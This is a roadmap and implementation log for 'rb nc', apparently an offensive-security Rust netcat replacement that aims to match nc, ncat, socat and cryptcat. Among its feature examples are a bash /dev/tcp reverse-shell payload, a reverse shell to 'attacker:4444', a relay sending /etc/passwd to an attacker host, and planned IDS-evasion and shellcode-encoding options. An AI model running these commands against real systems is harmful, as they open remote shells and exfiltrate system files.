# ğŸ¯ rb nc - The ULTIMATE Netcat

## TL;DR
Implementation log for the `rb nc` tool covering feature parity with nc/ncat/socat/cryptcat, outstanding roadmap items, and test guidance.

**Goal:** Replace nc + ncat + socat + cryptcat in ONE binary with ZERO dependencies

## âœ… Current Status (Phase 1 - DONE)

### Implemented Features

**Basic TCP/UDP:** âœ… WORKING
```bash
rb nc listen 4444                    # TCP listener
rb nc connect 192.168.1.1 80         # TCP client
rb nc listen 53 --udp                # UDP listener
rb nc connect 8.8.8.8 53 --udp       # UDP client
```

**Port Scanning:** âœ… WORKING
```bash
rb nc scan 8.8.8.8 53                # Test connection (zero-I/O)
rb nc scan 192.168.1.1 22 --timeout 2  # Custom timeout
```

**Reverse Shells:** âœ… WORKING
```bash
# Listener
rb nc listen 4444 --verbose

# Payload (generated by rb exploit)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# âœ… TESTED: Connection established successfully!
```

**Options:** âœ… WORKING
```bash
--udp, -u         # UDP mode
--verbose, -v     # Verbose output
--timeout, -t     # Connection timeout (seconds)
--hex, -x         # Hex dump mode
```

**Implementation:**
- Location: `src/modules/network/netcat.rs` (437 lines)
- CLI: `src/cli/commands/nc.rs` (244 lines)
- **ZERO external dependencies** - Pure Rust `std::net`

---

## ğŸš€ Phase 2: Ncat Features (Nmap's Netcat)

### 2.1 DNS Resolution â­â­â­ CRITICAL

**Problem:** Currently only accepts IP addresses
```bash
# âŒ Doesn't work:
rb nc scan google.com 443
# Error: Invalid address: invalid socket address syntax

# âœ… Works:
rb nc scan 142.250.185.46 443
```

**TODO:**
```rust
// src/modules/network/netcat/dns.rs
- [ ] DNS resolution using std::net::ToSocketAddrs
- [ ] Custom DNS server: --dns 1.1.1.1
- [ ] IPv4/IPv6 preference: --prefer-ipv4 / --prefer-ipv6
- [ ] Timeout for DNS lookups
```

**Examples:**
```bash
rb nc scan google.com 443            # Auto-resolve
rb nc connect example.com 80 --dns 1.1.1.1
rb nc scan example.com 22 --prefer-ipv4
```

### 2.2 SSL/TLS Encryption â­â­â­ CRITICAL

**Feature:** Encrypted connections (like ncat --ssl)

**TODO:**
```rust
// src/modules/network/netcat/tls.rs
- [ ] TLS 1.2 client/server (from scratch)
- [ ] TLS 1.3 client/server (from scratch)
- [ ] X.509 certificate parsing (from scratch)
- [ ] Self-signed cert generation
- [ ] Certificate verification
- [ ] SNI (Server Name Indication)
- [ ] Custom cipher suites
```

**Examples:**
```bash
# Server with SSL
rb nc listen 443 --ssl --cert server.crt --key server.key
rb nc listen 4444 --ssl --self-signed

# Client with SSL
rb nc connect example.com 443 --ssl
rb nc connect example.com 443 --ssl --verify
rb nc connect example.com 443 --ssl --ciphers "AES256-SHA"
```

**Implementation Strategy:**
1. Implement TLS 1.2 handshake from scratch (RFC 5246)
2. Implement TLS 1.3 handshake from scratch (RFC 8446)
3. X.509 certificate parsing (RFC 5280)
4. RSA/ECDSA signature verification
5. AES-GCM encryption
6. **NO OpenSSL dependency** - pure Rust std

### 2.3 Proxy Support â­â­â­ CRITICAL

**Feature:** SOCKS4/SOCKS5/HTTP proxy support

**TODO:**
```rust
// src/modules/network/netcat/proxy.rs
- [ ] SOCKS4 protocol (RFC 1928)
- [ ] SOCKS5 protocol (RFC 1929)
- [ ] SOCKS5 authentication
- [ ] HTTP CONNECT proxy (RFC 7231)
- [ ] Proxy authentication (username/password)
- [ ] Proxy DNS resolution
```

**Examples:**
```bash
# SOCKS proxies
rb nc connect target.com 80 --proxy socks4://proxy:1080
rb nc connect target.com 80 --proxy socks5://proxy:1080
rb nc connect target.com 80 --proxy socks5://user:pass@proxy:1080

# HTTP proxy
rb nc connect target.com 80 --proxy http://proxy:8080
rb nc connect target.com 80 --proxy http://user:pass@proxy:8080

# Proxy DNS
rb nc connect target.com 80 --proxy socks5://proxy:1080 --proxy-dns
```

### 2.4 Access Control â­â­

**Feature:** IP-based allow/deny rules

**TODO:**
```rust
// src/modules/network/netcat/acl.rs
- [ ] IP address matching
- [ ] CIDR subnet matching
- [ ] Allow list (whitelist)
- [ ] Deny list (blacklist)
- [ ] Load rules from file
- [ ] Connection limit per IP
```

**Examples:**
```bash
# Allow/deny specific IPs
rb nc listen 4444 --allow 192.168.1.0/24
rb nc listen 4444 --deny 10.0.0.0/8

# Load from file
rb nc listen 4444 --allowfile allowed_ips.txt
rb nc listen 4444 --denyfile banned_ips.txt

# Connection limits
rb nc listen 4444 --max-conns 10
rb nc listen 4444 --max-conns-per-ip 3
```

### 2.5 Connection Broker (Multi-client) â­â­

**Feature:** Chat server mode (multiple simultaneous connections)

**TODO:**
```rust
// src/modules/network/netcat/broker.rs
- [ ] Accept multiple simultaneous connections
- [ ] Broadcast messages to all clients
- [ ] Client connection/disconnection events
- [ ] Connection logging
- [ ] Message history
```

**Examples:**
```bash
# Start broker (chat server)
rb nc listen 4444 --broker

# Multiple clients can connect:
# Client 1: rb nc connect server 4444
# Client 2: rb nc connect server 4444
# Client 3: rb nc connect server 4444
# All messages broadcast to everyone

# With logging
rb nc listen 4444 --broker --chat-log chat.txt
```

### 2.6 Script Execution â­â­

**Feature:** Execute commands on connection

**TODO:**
```rust
// Already partially implemented via --exec flag
- [ ] Execute binary on connect
- [ ] Execute shell command
- [ ] Keep listening after disconnect
- [ ] Scripting support (Lua?)
```

**Examples:**
```bash
# Execute on connect
rb nc listen 4444 --exec /bin/bash
rb nc listen 4444 --sh-exec "bash -c 'whoami'"

# Keep listening (multiple connections)
rb nc listen 4444 --exec /bin/bash --keep-open

# Lua scripting
rb nc listen 4444 --lua-exec handler.lua
```

### 2.7 Advanced Options â­

**TODO:**
```bash
# IPv6 explicit
rb nc -6 listen 4444
rb nc -6 connect ::1 80

# Source port
rb nc connect host 80 --source-port 12345

# Send/receive only
rb nc connect host 80 --send-only
rb nc connect host 80 --recv-only

# Idle timeout
rb nc listen 4444 --idle-timeout 300

# Append output
rb nc connect host 80 --append-output capture.txt
```

---

## ğŸ”¥ Phase 3: Socat Features (Multipurpose Relay)

### 3.1 Port Forwarding / Relay â­â­â­ CRITICAL

**Feature:** Forward connections between endpoints

**TODO:**
```rust
// src/modules/network/netcat/relay.rs
- [ ] TCP to TCP forwarding
- [ ] UDP to UDP forwarding
- [ ] TCP to UDP relay
- [ ] UDP to TCP relay
- [ ] Fork mode (multiple simultaneous forwards)
- [ ] Reuseaddr option
```

**Examples:**
```bash
# Simple port forward
rb nc relay tcp:8080 tcp:internal:80

# UDP to TCP
rb nc relay udp:53 tcp:dns-server:53

# TCP to UDP
rb nc relay tcp:8080 udp:server:161

# Fork mode (multiple connections)
rb nc relay tcp:8080,fork tcp:backend:80

# Reuseaddr
rb nc relay tcp:8080,reuseaddr tcp:backend:80
```

### 3.2 PTY/TTY Support â­â­â­ CRITICAL

**Feature:** Proper terminal for shells

**TODO:**
```rust
// src/modules/network/netcat/pty.rs
- [ ] Allocate pseudo-terminal (PTY)
- [ ] Raw terminal mode
- [ ] Echo control
- [ ] Signal forwarding (SIGINT, SIGQUIT, SIGTSTP)
- [ ] Window size (TIOCGWINSZ)
- [ ] Terminal type (TERM env)
```

**Examples:**
```bash
# Allocate PTY for shell
rb nc listen 4444 --pty --exec /bin/bash

# Raw mode
rb nc listen 4444 --raw --exec /bin/bash

# Full TTY reverse shell
rb nc connect attacker:4444 --exec /bin/bash,pty,stderr

# Control echo
rb nc listen 4444 --pty --no-echo
```

**Why Important:**
- Proper job control (Ctrl+C, Ctrl+Z)
- Tab completion works
- Text editors work (vim, nano)
- su/sudo work properly
- Interactive programs work (less, more, top)

### 3.3 Unix Domain Sockets â­â­

**Feature:** Local IPC via Unix sockets

**TODO:**
```rust
// src/modules/network/netcat/unix_socket.rs
- [ ] Listen on Unix socket
- [ ] Connect to Unix socket
- [ ] Unix to TCP relay
- [ ] TCP to Unix relay
- [ ] Abstract namespace sockets (Linux)
- [ ] Socket permissions
```

**Examples:**
```bash
# Listen on Unix socket
rb nc listen unix:/tmp/socket

# Connect to Unix socket
rb nc connect unix:/var/run/docker.sock

# Relay Unix to TCP
rb nc relay unix:/tmp/socket tcp:server:80

# Docker example
rb nc connect unix:/var/run/docker.sock
GET /containers/json HTTP/1.0
```

### 3.4 File Operations â­

**Feature:** File I/O integration

**TODO:**
```bash
# Read from file
rb nc relay file:/etc/passwd tcp:attacker:4444

# Write to file
rb nc listen 4444 --output capture.txt

# Create file
rb nc listen 4444 --output newfile.txt --creat

# Append to file
rb nc listen 4444 --output log.txt --append

# File permissions
rb nc listen 4444 --output secret.txt --mode 0600
```

---

## ğŸ” Phase 4: Cryptcat Features (Encrypted Netcat)

### 4.1 Twofish Encryption â­â­

**Feature:** Symmetric encryption (like cryptcat)

**TODO:**
```rust
// src/modules/network/netcat/crypto.rs
- [ ] Twofish cipher (256-bit) from scratch
- [ ] CBC mode
- [ ] CFB mode
- [ ] OFB mode
- [ ] Key derivation (PBKDF2)
- [ ] IV generation
```

**Examples:**
```bash
# Encrypted connection
rb nc listen 4444 --encrypt --key mysecretkey
rb nc connect host 4444 --encrypt --key mysecretkey

# Key from file
rb nc listen 4444 --encrypt --keyfile key.txt

# Key from environment
export NC_KEY="mysecretkey"
rb nc listen 4444 --encrypt --keyenv NC_KEY

# Cipher modes
rb nc listen 4444 --encrypt --key secret --cipher-mode cfb
```

---

## ğŸŒŸ Phase 5: Extra Features (Better than ALL)

### 5.1 Rate Limiting â­â­

**Feature:** Bandwidth control

**TODO:**
```rust
// src/modules/network/netcat/rate_limit.rs
- [ ] Bytes per second limit
- [ ] Connection rate limit
- [ ] Token bucket algorithm
- [ ] Per-connection limits
```

**Examples:**
```bash
# Bandwidth limit
rb nc connect host 80 --rate-limit 1M
rb nc listen 4444 --rate-limit 512K

# Connection rate
rb nc listen 4444 --conn-rate 10/sec

# Bytes per second
rb nc connect host 80 --bps 102400
```

### 5.2 Logging & Monitoring â­

**Feature:** Traffic analysis

**TODO:**
```bash
# Connection log
rb nc listen 4444 --log connections.log

# Traffic capture
rb nc listen 4444 --traffic-log traffic.pcap

# Statistics
rb nc listen 4444 --stats
# Output: 10 connections, 1.5GB transferred, 127 sec uptime

# Real-time metrics
rb nc listen 4444 --metrics
# Updates every second with live stats
```

### 5.3 File Transfer Optimizations â­

**Feature:** Better file transfer

**TODO:**
```bash
# Resume support
rb nc receive 4444 --resume file.bin

# Compression
rb nc send 4444 file.bin --compress

# Checksums
rb nc send 4444 file.bin --checksum md5
rb nc send 4444 file.bin --checksum sha256

# Progress bar
rb nc send 4444 bigfile.iso --progress
# [==============>                    ] 45% 2.3GB/5.1GB ETA: 02:15
```

### 5.4 Security Features â­â­

**Feature:** Anti-detection & exploitation helpers

**TODO:**
```bash
# Randomized timing (evade IDS)
rb nc connect host 80 --random-timing

# Traffic fragmentation
rb nc connect host 80 --fragment 128

# Shellcode encoding
rb nc listen 4444 --shellcode-encoder xor

# ROP chain generation
rb nc listen 4444 --rop-chain libc.so
```

---

## ğŸ“Š Feature Matrix

| Feature | nc | ncat | socat | cryptcat | rb nc |
|---------|-----|------|-------|----------|-------|
| **Basic TCP/UDP** | âœ… | âœ… | âœ… | âœ… | âœ… |
| **Port Scanning** | âœ… | âœ… | âŒ | âœ… | âœ… |
| **Reverse Shells** | âœ… | âœ… | âœ… | âœ… | âœ… |
| **Hex Dump** | âŒ | âŒ | âŒ | âŒ | âœ… |
| **DNS Resolution** | âœ… | âœ… | âœ… | âœ… | âŒ Phase 2 |
| **SSL/TLS** | âŒ | âœ… | âœ… | âŒ | âŒ Phase 2 |
| **Proxy (SOCKS/HTTP)** | âŒ | âœ… | âŒ | âŒ | âŒ Phase 2 |
| **Access Control** | âŒ | âœ… | âŒ | âŒ | âŒ Phase 2 |
| **Multi-client (broker)** | âŒ | âœ… | âŒ | âŒ | âŒ Phase 2 |
| **Port Forwarding** | âŒ | âŒ | âœ… | âŒ | âŒ Phase 3 |
| **PTY/TTY** | âŒ | âŒ | âœ… | âŒ | âŒ Phase 3 |
| **Unix Sockets** | âŒ | âŒ | âœ… | âŒ | âŒ Phase 3 |
| **Encryption (Twofish)** | âŒ | âŒ | âŒ | âœ… | âŒ Phase 4 |
| **Rate Limiting** | âŒ | âŒ | âŒ | âŒ | âŒ Phase 5 |
| **Traffic Logging** | âŒ | âŒ | âŒ | âŒ | âŒ Phase 5 |
| **File Transfer Resume** | âŒ | âŒ | âŒ | âŒ | âŒ Phase 5 |
| **Zero Dependencies** | âŒ | âŒ | âŒ | âŒ | âœ… |
| **Binary Size** | 30KB | 380KB | 320KB | 35KB | 2.3MB |

---

## ğŸ¯ Implementation Priority

**MUST HAVE (Phase 2):**
1. DNS resolution â­â­â­ (fix hostname support)
2. SSL/TLS encryption â­â­â­ (TLS 1.2/1.3 from scratch)
3. Proxy support â­â­â­ (SOCKS4/5, HTTP)

**HIGHLY RECOMMENDED (Phase 3):**
4. Port forwarding â­â­â­ (socat-style relay)
5. PTY/TTY support â­â­â­ (proper shells)

**NICE TO HAVE:**
6. Access control â­â­
7. Multi-client broker â­â­
8. Unix sockets â­
9. Encryption (Twofish) â­
10. Extra features â­

---

## ğŸš€ Next Steps

1. **Immediate:** Fix DNS resolution (Phase 2.1)
2. **Week 1:** Implement SSL/TLS (Phase 2.2)
3. **Week 2:** Add proxy support (Phase 2.3)
4. **Week 3:** Port forwarding (Phase 3.1)
5. **Week 4:** PTY/TTY support (Phase 3.2)

**Goal:** Make `rb nc` the **ULTIMATE netcat** - better than nc + ncat + socat + cryptcat COMBINED!
